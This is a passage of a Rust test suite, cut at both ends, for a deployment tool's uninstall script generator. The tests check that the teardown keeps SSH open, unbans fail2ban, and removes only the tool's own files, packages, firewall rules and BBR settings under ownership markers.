        // port must be re-asserted `ufw allow` both before the sweep and as the final
        // word — so a marker-less / admin-pre-active ufw can never leave SSH closed.
        let extras = build_uninstall_extras("sudo ", "example.com", 2222);
        assert!(
            extras.contains(r#"grep -vE '(^|[^0-9])2222/tcp([^0-9]|$)'"#),
            "sweep must exclude the SSH port by anchored token (not a bare digit): {extras}"
        );
        assert!(
            extras.contains("ufw allow 2222/tcp comment 'SSH keep active session'"),
            "must re-assert the SSH allow BEFORE the sweep (survives a conntrack flush)"
        );

        let s = build_uninstall_script("sudo ", "/opt/trusttunnel", "trusttunnel_endpoint", "example.com", 2222, 0, false, false, false, None, &UninstallSelection::restore_all(), None);
        let reassert = "ufw allow 2222/tcp comment 'SSH keep active session'";
        // Re-asserted at least twice: pre-sweep (in extras) AND as the final word.
        assert!(
            s.matches(reassert).count() >= 2,
            "SSH allow must be re-asserted pre-sweep AND as the final word"
        );
        // The FINAL re-assert must come AFTER the marker-gated ufw disable/purge block.
        let last_reassert = s.rfind(reassert).expect("final SSH re-assert must exist");
        let disable_off = s.rfind("ufw --force disable").expect("ufw disable present");
        assert!(
            last_reassert > disable_off,
            "the FINAL SSH re-assert must come after the ufw disable/purge block"
        );
    }

    #[test]
    fn uninstall_fail2ban_unbans_before_stop_and_clears_ban_db_and_orphans() {
        // post-UAT brick fix: a fail2ban self-ban must never outlive uninstall. Unban
        // BEFORE stop (only a live daemon can unban), drop the persisted ban DB, and
        // sweep orphan f2b chains ONLY when the daemon is not active. M-01: the
        // we-installed (unban --all + purge) branch requires a snapshot proving fail2ban
        // was absent before us — pass one (None/legacy takes the conservative branch).
        let s = build_uninstall_script("sudo ", "/opt/trusttunnel", "trusttunnel_endpoint", "example.com", 2222, 0, false, false, false, None, &UninstallSelection::restore_all(), Some(&snapshot_all_ours()));
        let unban = s.find("fail2ban-client unban --all").expect("must unban-all in the we-installed branch");
        let stop = s.find("systemctl stop fail2ban").expect("must stop fail2ban");
        assert!(unban < stop, "unban-all must come BEFORE systemctl stop (a live daemon is needed to unban)");
        assert!(s.contains("rm -rf /var/lib/fail2ban"), "must drop the persisted ban DB (survives reboot otherwise)");
        assert!(
            s.contains(r#"fail2ban-client set sshd unbanip "$TT_SSH_IP""#),
            "admin-preexisting branch must scope-unban THIS session's IP (never unban --all)"
        );
        assert!(s.contains("systemctl is-active --quiet fail2ban"), "orphan sweep must be gated on an INACTIVE fail2ban");
        assert!(s.contains("f2b-"), "orphan sweep must target f2b-* chains");
    }

    #[test]
    fn uninstall_script_preserves_full_lifecycle_and_no_broad_firewall_delete() {
        // Behavior-preserving: the extraction into build_uninstall_script must keep
        // the same lifecycle (Step 0..7 + VERIFY) AND interpolate the
        // ownership-scoped extras (no broad firewall delete introduced).
        let s = build_uninstall_script("sudo ", "/opt/trusttunnel", "trusttunnel_endpoint", "example.com", 2222, 0, false, false, false, None, &UninstallSelection::restore_all(), None);
        // Step 0 stop-in-progress (interpolated build_stop_in_progress)
        assert!(s.contains("/tmp/tt_deploy.pid"), "Step 0 stop-in-progress must be interpolated");
        // Step 1 stop/disable, Step 2 kill, Step 4 rm dir, Step 5 cron
        assert!(s.contains("systemctl stop trusttunnel"), "Step 1 stop missing");
        assert!(s.contains("killall -9 trusttunnel_endpoint"), "Step 2 kill missing");
        assert!(s.contains("rm -rfv /opt/trusttunnel"), "Step 4 rm dir missing");
        assert!(s.contains("/etc/cron.d/trusttunnel-cert-renew"), "Step 5 cron removal missing");
        // Extras (build_uninstall_extras) interpolated: LE state + ownership-scoped firewall
        assert!(s.contains("certbot delete --cert-name example.com"), "LE state removal not interpolated");
        assert!(s.contains("--comment trusttunnel-managed"), "ownership-scoped iptables not interpolated");
        // NO-BROAD-DELETE invariant survives the extraction.
        assert!(!s.contains("delete allow 80/tcp"), "forbidden broad ufw delete on 80/tcp");
        assert!(!s.contains("delete allow 443/tcp"), "forbidden broad ufw delete on 443/tcp");
        // Step 7 find + VERIFY
        assert!(s.contains("-name '*trusttunnel*'"), "Step 7 find missing");
        assert!(s.contains("UNINSTALL_OK"), "VERIFY block missing");
    }

    // ── COCOON MANIFEST symmetry (06-16 C-18): install-writes(OWNED) ⊆ uninstall-
    //    removals. If a future deploy.rs write forgets its uninstall removal, CI
    //    goes red — the C-15/C-16 drift class cannot silently recur. ──

    #[test]
    fn cocoon_manifest_symmetry_every_owned_path_is_removed() {
        // The OWNED removal set — every server path the install can write (per the
        // COCOON MANIFEST in deploy.rs). build_uninstall_script (which interpolates
        // build_uninstall_extras) must contain a removal targeting EACH. Adding a fake
        // path here would turn the test red — that is the drift guard working.
        //
        // Phase 18 / WR-8: pass OUR ownership markers (mtproto_is_ours=true + .tt-bbr-prior
        // "cubic") + a real telemt port, so the MTProto + BBR folds are emitted and their owned
        // paths participate in the symmetry check. (Snapshot absence no longer authorizes the
        // folds — the marker is the sole authority.)
        let s = build_uninstall_script(
            "sudo ", "/opt/trusttunnel", "trusttunnel_endpoint", "example.com", 2222,
            8443, true, false, false, Some("cubic"), &UninstallSelection::restore_all(), Some(&snapshot_all_ours()),
        );
        let owned: &[&str] = &[
            // ENDPOINT_DIR — all config + certs + binaries (Step 4)
            "/opt/trusttunnel",
            // systemd unit (Step 3)
            "/etc/systemd/system/trusttunnel.service",
            // C-15: the .service.d drop-in DIR (Step 3, rm -rf)
            "/etc/systemd/system/trusttunnel.service.d",
            // C-16: the /usr/local/sbin cert-renew helper (Step 6)
            "/usr/local/sbin/trusttunnel",
            // OUR cron entry (Step 5)
            "/etc/cron.d/trusttunnel-cert-renew",
            // CAMOUFLAGE REMOVED: the trusttunnel-decoy.service unit is no longer written
            // (camouflage feature dropped), so it is no longer an owned path to assert.
            // LE cert STATE for the host (extras Step 5b)
            "/etc/letsencrypt/live/example.com",
            // firewall ownership-scoped removal (extras Step 5c/5d): ufw rules swept
            // by comment + iptables by tag. (Pre-fix this listed the literal
            // 'trusttunnel-acme'/'trusttunnel-tls' comments; the ufw sweep now matches
            // ANY 'trusttunnel'/'HTTP cert renewal' comment — pinned by the dedicated
            // ufw_rule_sweep_matches_real_install_comments test.)
            "ufw status numbered",
            "trusttunnel-managed",
            // Phase 18 MTProto fold (Step 5g, ownership-gated): telemt binary + config +
            // working dirs + the system user removal (build_telemt_teardown).
            "/bin/telemt",
            "rm -rf /etc/telemt /opt/telemt",
            "userdel -r telemt",
            // Phase 18 BBR fold (Step 5h, snapshot-off-gated): revert the running congestion
            // control + remove the persisted sysctl lines (build_bbr_revert).
            "net.ipv4.tcp_congestion_control=cubic",
        ];
        for path in owned {
            assert!(
                s.contains(path),
                "COCOON drift: owned install-write `{path}` has no uninstall removal in build_uninstall_script — add the removal (and keep the deploy.rs COCOON MANIFEST in sync)"
            );
        }
    }

    #[test]
    fn cocoon_manifest_doc_comment_exists_in_deploy_and_lists_c15_c16_paths() {
        // C-18: the COCOON MANIFEST in deploy.rs is the single source of truth. Assert
        // the marker + the two previously-leaking paths (C-15 .service.d, C-16
        // /usr/local/sbin helper) so the doc stays authoritative for the D-18 UI.
        let deploy_src = include_str!("../deploy.rs");
        assert!(deploy_src.contains("COCOON MANIFEST"), "deploy.rs must carry the COCOON MANIFEST marker");
        assert!(
            deploy_src.contains("/etc/systemd/system/trusttunnel.service.d"),
            "manifest must list the C-15 .service.d drop-in dir"
        );
        assert!(
            deploy_src.contains("/usr/local/sbin/trusttunnel-cert-renew.sh"),
            "manifest must list the C-16 /usr/local/sbin cert-renew helper"
        );
        // C-20 boundary must be stated in the manifest (packages not purged).
        assert!(
            deploy_src.contains("ADMIN-SHARED") || deploy_src.contains("admin-shared"),
            "manifest must state the C-20 admin-shared not-purged boundary"
        );
    }

    // ── Phase 18 (18-04): component-selective, snapshot-evidence-gated FULL REVERT ──

    // Conceptually-named literals kept in the TEST file only (comment-text discipline):
    // the token a fold's presence is asserted by.
    const TELEMT_FOLD_TOKEN: &str = "systemctl stop telemt";
    const BBR_FOLD_TOKEN: &str = "net.ipv4.tcp_congestion_control=cubic";
    const SSH_REASSERT: &str = "ufw allow 2222/tcp comment 'SSH keep active session'";

    fn script_with(
        selection: &UninstallSelection,
        snapshot: Option<&PreInstallSnapshot>,
        telemt_port: u16,
    ) -> String {
        // mtproto_is_ours=false + no ufw/f2b/bbr install-markers → these tests exercise the
        // SNAPSHOT-gated ownership path exclusively (the 18-09/18-10 marker paths have their
        // own dedicated tests below).
        build_uninstall_script(
            "sudo ", "/opt/trusttunnel", "trusttunnel_endpoint", "example.com", 2222,
            telemt_port, false, false, false, None, selection, snapshot,
        )
    }

    // 18-09: variant that threads the MTProto ownership MARKER (mtproto_is_ours).
    fn script_with_marker(
        selection: &UninstallSelection,
        snapshot: Option<&PreInstallSnapshot>,
        telemt_port: u16,
        mtproto_is_ours: bool,
    ) -> String {
        build_uninstall_script(
            "sudo ", "/opt/trusttunnel", "trusttunnel_endpoint", "example.com", 2222,
            telemt_port, mtproto_is_ours, false, false, None, selection, snapshot,
        )
    }

    // 18-10: variant that threads the ufw/fail2ban INSTALL-markers + the .tt-bbr-prior
    // marker — the LEGACY (no-snapshot) ownership proofs for the package purge + BBR revert.
    fn script_with_legacy_markers(
        selection: &UninstallSelection,
        snapshot: Option<&PreInstallSnapshot>,
        ufw_pkg_ours: bool,
        fail2ban_pkg_ours: bool,
        bbr_prior_marker: Option<&str>,
    ) -> String {
        build_uninstall_script(
            "sudo ", "/opt/trusttunnel", "trusttunnel_endpoint", "example.com", 2222,
            0, false, ufw_pkg_ours, fail2ban_pkg_ours, bbr_prior_marker, selection, snapshot,
        )
    }

    // Both component-ownership markers present (mtproto_is_ours + .tt-bbr-prior) — the ONLY
    // authorization for the destructive telemt/BBR folds after the WR-8 tightening (snapshot
    // absence no longer authorizes). `bbr_marker` drives the revert to that recorded algo.
    fn script_full_ours(
        selection: &UninstallSelection,
        snapshot: Option<&PreInstallSnapshot>,
        telemt_port: u16,
        bbr_marker: Option<&str>,
    ) -> String {
        build_uninstall_script(
            "sudo ", "/opt/trusttunnel", "trusttunnel_endpoint", "example.com", 2222,
            telemt_port, true, false, false, bbr_marker, selection, snapshot,
        )
    }

    #[test]
    fn mtproto_fold_requires_the_marker_snapshot_absence_never_authorizes_wr8() {
        // WR-8 (18-UAT owner principle): the telemt fold fires ONLY on OUR `.tt-installed-mtproto`
        // marker (mtproto_is_ours). Snapshot "telemt was absent before us" NO LONGER authorizes —
        // an admin could have installed their own telemt after us, and first-touch absence would
        // wrongly destroy it. The marker path is covered by
        // `mtproto_fold_fires_on_ownership_marker_even_without_a_snapshot_18_09`.
        let sel = UninstallSelection::restore_all(); // mtproto = true

        // (1) snapshot proves telemt ABSENT but NO marker → NO fold (the WR-8 fix — was: folded).
        let absent = snapshot_all_ours(); // mtproto_present = false
        let s = script_with(&sel, Some(&absent), 8443);
        assert!(!s.contains(TELEMT_FOLD_TOKEN), "snapshot-absent alone must NOT authorize removing telemt (WR-8): {s}");
        assert!(!s.contains("=== Step 5g:"), "no telemt fold header without the ownership marker: {s}");

        // (2) snapshot shows telemt PRESENT (admin's own) + no marker → NO fold (D-05).
        let present = PreInstallSnapshot { mtproto_present: true, ..snapshot_all_ours() };
        let s = script_with(&sel, Some(&present), 8443);
        assert!(!s.contains(TELEMT_FOLD_TOKEN), "must NEVER remove a pre-existing (admin) telemt: {s}");

        // (3) None snapshot (legacy) + no marker → NO fold (conservative).
        let s = script_with(&sel, None, 8443);
        assert!(!s.contains(TELEMT_FOLD_TOKEN), "legacy no-snapshot + no marker must not fold");

        // (4) marker present but selection.mtproto UNCHECKED → NO fold (the checkbox still gates).
        let sel_no_mt = UninstallSelection { mtproto: false, ..UninstallSelection::restore_all() };
        let s = script_with_marker(&sel_no_mt, Some(&absent), 8443, true);
        assert!(!s.contains(TELEMT_FOLD_TOKEN), "unchecking MTProto must skip the fold");
    }

    #[test]
    fn mtproto_fold_fires_on_ownership_marker_even_without_a_snapshot_18_09() {
        // 18-09: the LEGACY hole. A server with NO pre-install snapshot (installed before
        // the snapshot feature) whose MTProto WE installed carries the marker → the fold
        // MUST fire off the marker alone, closing the former «accepted D-06 tail».
        let sel = UninstallSelection::restore_all(); // mtproto = true

        // (1) LEGACY (snapshot=None) + marker present (ours) → fold FIRES.
        let s = script_with_marker(&sel, None, 8443, true);
        assert!(
            s.contains(TELEMT_FOLD_TOKEN),
            "legacy app-installed MTProto (marker present, no snapshot) must fold: {s}"
        );
        assert!(s.contains("=== Step 5g:"), "telemt fold step header missing under marker path");

        // (2) LEGACY + NO marker (admin's own telemt, or not-yet-remarked) → NO fold (D-05).
        let s = script_with_marker(&sel, None, 8443, false);
        assert!(
            !s.contains(TELEMT_FOLD_TOKEN),
            "legacy with neither marker nor snapshot must NEVER fold (admin's telemt): {s}"
        );

        // (3) marker present but selection.mtproto UNCHECKED → NO fold (the checkbox still gates).
        let sel_no_mt = UninstallSelection { mtproto: false, ..UninstallSelection::restore_all() };
        let s = script_with_marker(&sel_no_mt, None, 8443, true);
        assert!(!s.contains(TELEMT_FOLD_TOKEN), "unchecking MTProto must skip the fold even with the marker");

        // (4) marker AND snapshot-proves-present (admin's own, but we ALSO marked?) — marker
        //     wins the OR, so the fold fires. This is safe: OUR install only writes the marker
        //     when WE installed telemt, so a marker means it is genuinely ours regardless of
        //     what the snapshot recorded. Documents the OR semantics explicitly.
        let present = PreInstallSnapshot { mtproto_present: true, ..snapshot_all_ours() };
        let s = script_with_marker(&sel, Some(&present), 8443, true);
        assert!(s.contains(TELEMT_FOLD_TOKEN), "marker ownership must fold via the OR even if snapshot recorded present: {s}");

        // (5) SACRED SSH-port re-assert stays LAST under the new marker branch too (D-INV-1).
        let last_reassert = s.rfind(SSH_REASSERT).expect("final SSH re-assert must exist");
        let fold_off = s.find(TELEMT_FOLD_TOKEN).expect("telemt fold present");
        assert!(
            last_reassert > fold_off,
            "the FINAL SSH re-assert must come AFTER the marker-path MTProto fold (last={last_reassert}, fold={fold_off})"
        );
    }

    #[test]
    fn bbr_revert_requires_the_marker_snapshot_alone_never_authorizes_wr8() {
        // WR-8 (18-UAT owner principle): the BBR revert fires ONLY on OUR `.tt-bbr-prior` marker,
        // NOT the snapshot. A first-touch snapshot recording "BBR was off before us" does not
        // prove WE enabled the CURRENT BBR (an admin could have enabled it after us). The marker
        // path is covered by `bbr_fold_fires_on_prior_marker_even_without_a_snapshot_18_10`.
        let sel = UninstallSelection::restore_all(); // bbr = true

        // snapshot proves BBR was off (cubic) but NO marker → NO revert (was: reverted — WR-8 fix).
        let off = snapshot_all_ours(); // bbr_value = "cubic"
        let s = script_with(&sel, Some(&off), 0);
        assert!(!s.contains(BBR_FOLD_TOKEN), "snapshot-only (no marker) must NOT authorize a BBR revert (WR-8): {s}");
        assert!(!s.contains("=== Step 5h:"), "no BBR fold header without the ownership marker: {s}");

        // snapshot records reno, still no marker → NO revert.
        let reno = PreInstallSnapshot { bbr_value: "reno".to_string(), ..snapshot_all_ours() };
        let s = script_with(&sel, Some(&reno), 0);
        assert!(!s.contains("tcp_congestion_control=reno"), "snapshot alone must not drive a revert: {s}");

        // None snapshot + no marker → NO revert.
        let s = script_with(&sel, None, 0);
        assert!(!s.contains(BBR_FOLD_TOKEN), "legacy no-snapshot + no marker must not revert BBR");

        // marker present but selection.bbr UNCHECKED → NO revert (the checkbox still gates).
        let sel_no_bbr = UninstallSelection { bbr: false, ..UninstallSelection::restore_all() };
        let s = script_with_legacy_markers(&sel_no_bbr, Some(&off), false, false, Some("cubic"));
        assert!(!s.contains("=== Step 5h:"), "unchecking BBR must skip the revert even with the marker");
    }

    #[test]
    fn bbr_fold_fires_on_prior_marker_even_without_a_snapshot_18_10() {
        // 18-10 legacy hole: a server with NO pre-install snapshot whose BBR WE enabled
        // carries the `.tt-bbr-prior` marker → the revert MUST fold off the marker alone,
        // restoring the recorded prior algo + deleting our sysctl lines + dropping the marker.
        let sel = UninstallSelection::restore_all(); // bbr = true

        // (1) LEGACY (snapshot=None) + marker "cubic" → fold FIRES, restores cubic, rm marker.
        let s = script_with_legacy_markers(&sel, None, false, false, Some("cubic"));
        assert!(s.contains("tcp_congestion_control=cubic"), "legacy marker must restore the recorded algo: {s}");
        assert!(s.contains("=== Step 5h:"), "BBR fold step header missing under the marker path");
        assert!(
            s.contains("rm -f /opt/trusttunnel/.tt-bbr-prior"),
            "the fold must drop the spent .tt-bbr-prior marker: {s}"
        );

        // (2) LEGACY + NO marker + NO snapshot → NO revert (conservative D-06).
        let s = script_with_legacy_markers(&sel, None, false, false, None);
        assert!(!s.contains("=== Step 5h:"), "legacy with neither marker nor snapshot must not revert BBR: {s}");

        // (3) marker records an admin's own BBR (`bbr`) → NEVER reverted (whitelist refuses).
        let s = script_with_legacy_markers(&sel, None, false, false, Some("bbr"));
        assert!(!s.contains("=== Step 5h:"), "a marker recording 'bbr' must never revert (admin's BBR): {s}");

        // (4) an unknown/garbage prior → NEVER reverted (not on the whitelist).
        let s = script_with_legacy_markers(&sel, None, false, false, Some("something-weird"));
        assert!(!s.contains("=== Step 5h:"), "an unknown prior algo must never revert: {s}");

        // (5) marker present but selection.bbr UNCHECKED → NO revert (the checkbox still gates).
        let sel_no_bbr = UninstallSelection { bbr: false, ..UninstallSelection::restore_all() };
        let s = script_with_legacy_markers(&sel_no_bbr, None, false, false, Some("cubic"));
        assert!(!s.contains("=== Step 5h:"), "unchecking BBR must skip the revert even with the marker");

        // (6) WR-8: the MARKER is the sole authority. Even with a snapshot recording cubic, the
        //     marker's recorded algo (reno) is what gets restored — the snapshot no longer drives.
        let off = snapshot_all_ours(); // bbr_value = "cubic" (ignored for the revert now)
        let s = script_with_legacy_markers(&sel, Some(&off), false, false, Some("reno"));
        assert!(s.contains("tcp_congestion_control=reno"), "the marker's recorded algo must be restored (WR-8): {s}");
        assert!(!s.contains("tcp_congestion_control=cubic"), "the snapshot must not drive the revert when a marker exists: {s}");
    }

    #[test]
    fn package_purge_fires_on_install_marker_even_without_a_snapshot_18_10() {
        // 18-10 legacy hole (FIX 2/3): a server with NO snapshot whose ufw/fail2ban WE
        // apt-installed carries the `.tt-installed-{ufw,fail2ban}` marker → the build-time
        // purge branch MUST be emitted off the marker alone (the in-shell $TT_INSTALLED_*
        // gate is the belt-and-suspenders second gate).
        let sel = UninstallSelection::restore_all();

        // (1) LEGACY + ufw install-marker (ours) → ufw purge emitted; fail2ban marker absent → not.
        let s = script_with_legacy_markers(&sel, None, true, false, None);
        assert!(s.contains("apt-get purge -y ufw"), "legacy ufw install-marker must emit the ufw purge: {s}");
        assert!(!s.contains("apt-get purge -y fail2ban"), "no fail2ban marker ⇒ no fail2ban purge: {s}");
        // Still marker-gated in-shell (double gate).
        assert!(s.contains(r#"[ "$TT_INSTALLED_UFW" = "1" ]"#), "ufw purge stays in-shell marker-gated");

        // (2) LEGACY + fail2ban install-marker (ours) → fail2ban purge emitted; ufw absent → not.
        let s = script_with_legacy_markers(&sel, None, false, true, None);
        assert!(s.contains("apt-get purge -y fail2ban"), "legacy fail2ban install-marker must emit the fail2ban purge: {s}");
        assert!(!s.contains("apt-get purge -y ufw"), "no ufw marker ⇒ no ufw purge: {s}");

        // (3) LEGACY + NO markers (admin's pre-existing packages) → NEITHER purge (conservative).
        let s = script_with_legacy_markers(&sel, None, false, false, None);
        assert!(!s.contains("apt-get purge -y ufw"), "legacy without ufw marker ⇒ ufw kept (admin's): {s}");
        assert!(!s.contains("apt-get purge -y fail2ban"), "legacy without fail2ban marker ⇒ fail2ban kept (admin's): {s}");

        // (4) marker present but selection UNCHECKED → no purge (the checkbox still gates).
        let sel_keep = UninstallSelection { ufw: false, fail2ban: false, ..UninstallSelection::restore_all() };
        let s = script_with_legacy_markers(&sel_keep, None, true, true, None);
        assert!(!s.contains("apt-get purge -y ufw"), "unchecked ufw ⇒ no purge even with the marker");
        assert!(!s.contains("apt-get purge -y fail2ban"), "unchecked fail2ban ⇒ no purge even with the marker");

        // (5) admin-shared packages are STILL never purged (C-20 boundary holds under the marker path).
        let s = script_with_legacy_markers(&sel, None, true, true, None);
        assert!(!s.contains("purge -y certbot"), "must never purge certbot (C-20)");
        assert!(!s.contains("purge -y curl"), "must never purge curl (C-20)");
        assert!(!s.contains("purge -y iptables"), "must never purge iptables (C-20)");
    }

    #[test]
    fn pkg_marker_probe_reads_bare_test_f_and_parses_tokens_18_10() {
        // The probe must be a bare `test -f` (no content read → no leak, D-29) on the two
        // install-markers, and the parser must map the fixed tokens back to (ufw, fail2ban).
        let cmd = build_pkg_marker_probe("sudo ");
        assert!(cmd.contains("test -f /opt/trusttunnel/.tt-installed-ufw"), "must probe the ufw marker: {cmd}");
        assert!(cmd.contains("test -f /opt/trusttunnel/.tt-installed-fail2ban"), "must probe the fail2ban marker: {cmd}");
        assert!(!cmd.contains("cat "), "must NOT read marker content (bare test -f only): {cmd}");
        assert_eq!(parse_pkg_marker_probe("UFW_PKG_OURS\nF2B_PKG_OURS"), (true, true));
        assert_eq!(parse_pkg_marker_probe("UFW_PKG_NOT_OURS\nF2B_PKG_OURS"), (false, true));
        assert_eq!(parse_pkg_marker_probe("UFW_PKG_OURS\nF2B_PKG_NOT_OURS"), (true, false));
        assert_eq!(parse_pkg_marker_probe("UFW_PKG_NOT_OURS\nF2B_PKG_NOT_OURS"), (false, false));
    }

    #[test]
    fn sacred_ssh_reassert_stays_last_under_the_legacy_marker_paths_18_10() {
        // D-INV-1 must hold for the new marker-driven branches too: the FINAL SSH re-assert
        // is the last firewall word even when the BBR revert + ufw purge fire off markers.
        let sel = UninstallSelection::restore_all();
        let s = script_with_legacy_markers(&sel, None, true, true, Some("cubic"));
        let last_reassert = s.rfind(SSH_REASSERT).expect("final SSH re-assert must exist");
        let disable = s.rfind("ufw --force disable").expect("ufw disable present");
        assert!(last_reassert > disable, "SSH re-assert must be after the marker-driven ufw purge");
        let step6 = s.find("=== Step 6:").expect("Step 6 present");
        assert!(last_reassert < step6, "final re-assert must precede Step 6");
    }

    #[test]
    fn uninstall_always_removes_the_whole_dir_and_verifies_absence() {
        // 18-UAT: users are part of the protocol → the teardown UNCONDITIONALLY removes the whole
        // install dir (the optional «keep users» preserve path was removed — owner decision). No
        // find-with-spares, no selection-aware verify: every uninstall blanket-removes {dir} and
        // success = {dir} gone.
        let s = script_with(&UninstallSelection::restore_all(), Some(&snapshot_all_ours()), 0);
        assert!(s.contains("rm -rfv /opt/trusttunnel"), "must blanket-remove the whole dir: {s}");
        assert!(
            !s.contains("! -name credentials.toml"),
            "the keep-users preserve find must be gone: {s}"
        );
        assert!(
            s.contains("if test -d /opt/trusttunnel; then"),
            "verify success = dir absence: {s}"
        );
        assert!(s.contains("UNINSTALL_OK") && s.contains("UNINSTALL_FAILED"), "OK/FAILED sentinels present");
        // The service is still torn down.
        assert!(s.contains("systemctl stop trusttunnel"), "service must still be stopped");
        assert!(s.contains("rm -f /etc/systemd/system/trusttunnel.service"), "unit must still be removed");

        // «код -1» fix: the CORE_REMOVED_OK sentinel must be emitted right after the dir removal
        // and BEFORE the ufw/Fail2ban teardown, so uninstall_server can confirm success from the
        // partial output even if that teardown resets the SSH connection mid-script.
        let core_ok = s.find("CORE_REMOVED_OK").expect("CORE_REMOVED_OK sentinel present");
        let dir_rm = s.find("rm -rfv /opt/trusttunnel").expect("dir removal present");
        // Anchor on the echo marker («=== Step 5e:»), not bare «Step 5e» which also appears in a
        // header comment far above the actual teardown step.
        let fw_teardown = s.find("=== Step 5e:").expect("firewall teardown step present");
        assert!(dir_rm < core_ok, "core-removed sentinel must come AFTER the dir removal: {s}");
        assert!(core_ok < fw_teardown, "core-removed sentinel must come BEFORE the firewall teardown: {s}");
        assert!(s.contains("CORE_REMOVE_FAILED"), "the negative core-removal marker must also be present");
    }

    #[test]
    fn sacred_ssh_reassert_is_last_firewall_op_under_every_selection() {
        // D-INV-1: for EVERY selection combo the FINAL SSH re-assert is the last firewall
        // statement — including after the MTProto fold (whose ufw delete-by-number runs).
        let combos: &[UninstallSelection] = &[
            UninstallSelection::restore_all(),
            UninstallSelection { ufw: false, fail2ban: false, bbr: false, mtproto: false },
        ];
        let snap = snapshot_all_ours();
        for sel in combos {
            // WR-8: thread OUR markers so restore_all actually emits the telemt/BBR folds (the
            // snapshot alone no longer would); the all-false combo still folds nothing (selection
            // gates), so the `if let` below stays tolerant.
            let s = script_full_ours(sel, Some(&snap), 8443, Some("cubic"));
            let last_reassert = s.rfind(SSH_REASSERT).expect("final SSH re-assert must exist");
            // Nothing that manipulates the firewall may come after the final re-assert.
            if let Some(disable) = s.rfind("ufw --force disable") {
                assert!(last_reassert > disable, "SSH re-assert must be after ufw disable ({sel:?})");
            }
            if let Some(telemt) = s.rfind("=== Step 5g:") {
                assert!(last_reassert > telemt, "SSH re-assert must be after the MTProto fold ({sel:?})");
            }
            // The final re-assert must sit before the non-firewall Step 6 binary removal.
            let step6 = s.find("=== Step 6:").expect("Step 6 present");
            assert!(last_reassert < step6, "final re-assert must precede Step 6 ({sel:?})");
        }
    }

    #[test]
    fn component_folds_run_before_the_connection_resetting_step5e_cr2() {
        // CR-2 (Phase-18 re-review): the MTProto (5g) + BBR (5h) folds must be emitted BEFORE
        // Step 5e's fail2ban/ufw teardown. That teardown can reset THIS SSH channel (the «код -1»
        // case); a fold placed after it would silently never run while the app already reported
        // success — leaving telemt serving with a live secret / BBR still on.
        let snap = snapshot_all_ours();
        // WR-8: the folds now require OUR markers (mtproto_is_ours + .tt-bbr-prior), not the snapshot.
        let s = script_full_ours(&UninstallSelection::restore_all(), Some(&snap), 8443, Some("cubic"));
        let step5e = s.find("=== Step 5e:").expect("Step 5e present");
        let telemt = s.find("=== Step 5g:").expect("MTProto fold present under restore_all+markers");
        let bbr = s.find("=== Step 5h:").expect("BBR fold present under restore_all+markers");
        assert!(telemt < step5e, "MTProto fold (5g) must run BEFORE Step 5e: {s}");
        assert!(bbr < step5e, "BBR fold (5h) must run BEFORE Step 5e: {s}");
    }

    #[test]
    fn package_purge_is_triple_gated_marker_and_snapshot_absent_and_selection() {
        // (a) snapshot proves the package was ABSENT + selection set ⇒ purge present
        //     (still marker-gated in-shell by $TT_INSTALLED_*).
        let sel = UninstallSelection::restore_all();
        let absent = snapshot_all_ours(); // ufw_present = fail2ban_present = false
        let s = script_with(&sel, Some(&absent), 0);
        assert!(s.contains("apt-get purge -y ufw"), "absent+selection ⇒ ufw purge present");
        assert!(s.contains("apt-get purge -y fail2ban"), "absent+selection ⇒ fail2ban purge present");
        assert!(s.contains(r#"[ "$TT_INSTALLED_UFW" = "1" ]"#), "ufw purge stays marker-gated in-shell");
        assert!(s.contains(r#"[ "$TT_INSTALLED_F2B" = "1" ]"#), "fail2ban purge stays marker-gated in-shell");

        // (b) snapshot proves the package was PRESENT pre-install ⇒ purge ABSENT (package kept).
        let present = PreInstallSnapshot { ufw_present: true, fail2ban_present: true, ..snapshot_all_ours() };
        let s = script_with(&sel, Some(&present), 0);
        assert!(!s.contains("apt-get purge -y ufw"), "snapshot-present ⇒ ufw kept (no purge)");
        assert!(!s.contains("apt-get purge -y fail2ban"), "snapshot-present ⇒ fail2ban kept (no purge)");

        // (c) M-01: None snapshot (legacy, no snapshot) ⇒ NEVER purge the package —
        //     matches CONTEXT D-07 + security-posture.md. (Was: purge present.)
        let s = script_with(&sel, None, 0);
        assert!(!s.contains("apt-get purge -y ufw"), "None (legacy) ⇒ ufw NEVER purged (D-07)");
        assert!(!s.contains("apt-get purge -y fail2ban"), "None (legacy) ⇒ fail2ban NEVER purged (D-07)");

        // selection UNCHECKED for a package ⇒ no purge for it even with snapshot-absent.
        let sel_keep = UninstallSelection { ufw: false, fail2ban: false, ..UninstallSelection::restore_all() };
        let s = script_with(&sel_keep, Some(&absent), 0);
        assert!(!s.contains("apt-get purge -y ufw"), "unchecked ufw ⇒ no purge");
        assert!(!s.contains("apt-get purge -y fail2ban"), "unchecked fail2ban ⇒ no purge");

        // (d) admin-shared packages are NEVER purged (C-20), under any gate combination.
        for snap in [Some(&absent), None] {
            let s = script_with(&sel, snap, 0);
            assert!(!s.contains("purge -y certbot"), "must never purge certbot (C-20)");
            assert!(!s.contains("purge -y curl"), "must never purge curl (C-20)");
            assert!(!s.contains("purge -y iptables"), "must never purge iptables (C-20)");
        }
    }

    #[test]
    fn deprovision_helpers_gate_purge_but_keep_rule_cleanup() {
        // build_fail2ban_deprovision(sudo, selected, emit_purge): selected+purge → full purge.
        let f2b_purge = build_fail2ban_deprovision("sudo ", true, true);
        assert!(f2b_purge.contains("apt-get purge -y fail2ban"));
        assert!(f2b_purge.contains("fail2ban-client unban --all"));
        // selected but NOT owned (conservative): keep the package but still remove OUR jail.local.
        let f2b_conservative = build_fail2ban_deprovision("sudo ", true, false);
        assert!(!f2b_conservative.contains("apt-get purge -y fail2ban"), "conservative must not purge");
        assert!(!f2b_conservative.contains("systemctl stop fail2ban"), "conservative must not stop the admin daemon");
        assert!(f2b_conservative.contains("rm -f /etc/fail2ban/jail.local"), "conservative still removes OUR jail");
        assert!(f2b_conservative.contains(r#"set sshd unbanip "$TT_SSH_IP""#), "conservative scope-unbans this session IP");

        // build_ufw_deprovision(sudo, selected, emit_purge): selected+purge → purge the package.
        let ufw_purge = build_ufw_deprovision("sudo ", true, true);
        assert!(ufw_purge.contains("apt-get purge -y ufw"));
        // selected but NOT owned (conservative): keep the package, only revert an enable WE made.
        let ufw_conservative = build_ufw_deprovision("sudo ", true, false);
        assert!(!ufw_conservative.contains("apt-get purge -y ufw"), "conservative must not purge ufw");
        assert!(ufw_conservative.contains("ufw --force disable"), "conservative still reverts an enable WE made");

        // M-01: the bare system-wide `apt-get autoremove -y` cascade is GONE from both
        // purge branches — we purge only the named package, never system orphans.
